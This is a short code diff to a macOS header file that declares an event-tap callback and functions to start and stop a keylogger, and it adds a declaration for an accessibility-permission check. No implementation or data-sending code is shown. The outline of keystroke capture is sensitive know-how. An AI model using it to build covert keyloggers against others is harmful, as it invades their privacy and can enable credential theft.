@@ -9,5 +9,6 @@
 static inline CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
 static inline void startKeylogger(void);
 static inline void stopKeylogger(void);
+static inline bool checkAccessibilityPermission(bool prompt);
 
 #endif
